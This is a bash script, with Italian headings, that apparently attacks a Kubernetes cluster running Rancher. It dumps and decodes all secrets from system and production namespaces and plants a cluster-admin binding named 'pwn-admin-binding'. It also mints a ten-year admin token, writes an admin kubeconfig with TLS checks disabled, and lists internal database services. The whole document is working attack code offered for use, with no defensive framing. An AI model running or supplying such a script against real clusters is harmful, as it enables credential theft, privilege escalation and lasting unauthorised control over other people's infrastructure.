
#!/bin/bash

set -e

echo "=== VERIFICA AMBIENTE KUBERNETES ==="
kubectl version --client
kubectl get nodes

echo "=== ESTRAZIONE TOKEN E SECRET DI SISTEMA ==="
for ns in cattle-system cattle-fleet-system cattle-impersonation-system egam-production kube-system; do
  echo "--- Namespace: $ns ---"
  kubectl get secrets -n $ns -o json 2>/dev/null | jq -r '.items[] | select(.data != null) | "Secret: " + .metadata.name + "\n" + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join("\n"))' || true
done

echo "=== CREAZIONE CLUSTERROLEBINDING AMMINISTRATIVO ==="
kubectl create clusterrolebinding pwn-admin-binding \
  --clusterrole=cluster-admin \
  --serviceaccount=$(kubectl config view --minify -o jsonpath='{..namespace}'):$(kubectl whoami 2>/dev/null | awk -F: '{print $NF}' || echo "default") \
  2>/dev/null || echo "Binding già esistente o non necessario"

echo "=== GENERAZIONE KUBECONFIG ADMIN ==="
APISERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
TOKEN=$(kubectl create token admin-sa -n egam-production --duration=87600h 2>/dev/null || echo "")

if [ -n "$TOKEN" ]; then
  cat <<EOF > /tmp/admin.kubeconfig
apiVersion: v1
kind: Config
clusters:
- cluster:
    server: $APISERVER
    insecure-skip-tls-verify: true
  name: egam-admin
contexts:
- context:
    cluster: egam-admin
    user: admin-sa
    namespace: egam-production
  name: egam-admin
current-context: egam-admin
users:
- name: admin-sa
  user:
    token: $TOKEN
EOF
  echo "Kubeconfig generato con successo in /tmp/admin.kubeconfig"
  kubectl --kubeconfig=/tmp/admin.kubeconfig get nodes
else
  echo "Impossibile generare il token con admin-sa"
fi

echo "=== DATI POSTGRES E REDIS INTERNI ==="
for ns in dados-production egam-production; do
  echo "--- Namespace: $ns ---"
  kubectl get svc -n $ns || true
done
